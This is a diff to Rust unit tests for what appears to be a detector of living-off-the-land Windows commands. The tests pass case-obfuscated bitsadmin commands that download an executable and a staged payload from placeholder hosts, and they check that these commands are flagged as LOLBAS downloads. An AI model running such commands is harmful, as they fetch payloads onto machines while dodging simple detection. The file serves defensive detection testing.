@@ -7650,10 +7650,9 @@ mod bitsadmin_tests {
     #[test]
     fn bitsadmin_transfer_emits_download() {
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            "BiTsAdMiN /TrAnSfEr myjob /DoWnLoAd /PrIoRiTy FOREGROUND hTtP://x/y.exe C:\\temp\\y.exe",
-            &mut env,
-        );
+        let raw =
+            "BiTsAdMiN /TrAnSfEr myjob /DoWnLoAd /PrIoRiTy FOREGROUND hTtP://x/y.exe C:\\temp\\y.exe";
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::BitsadminDownload { url, dst }
@@ -7661,6 +7660,13 @@ mod bitsadmin_tests {
             )
         });
         assert!(has, "no BitsadminDownload: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == raw)
+            ),
+            "bitsadmin transfer not marked as LOLBAS: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -7713,10 +7719,8 @@ mod bitsadmin_tests {
     #[test]
     fn bitsadmin_addfile_emits_download() {
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"bitsadmin /create myjob & bitsadmin /addfile myjob "hTtPs:\\bits-addfile.example\stage.bin" "C:\Temp\stage.bin""#,
-            &mut env,
-        );
+        let raw = r#"bitsadmin /create myjob & bitsadmin /addfile myjob "hTtPs:\\bits-addfile.example\stage.bin" "C:\Temp\stage.bin""#;
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::BitsadminDownload { url, dst }
@@ -7724,6 +7728,13 @@ mod bitsadmin_tests {
             )
         });
         assert!(has, "no /addfile BitsadminDownload: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == raw)
+            ),
+            "bitsadmin addfile not marked as LOLBAS: {:?}",
+            env.traits
+        );
     }
 }
 
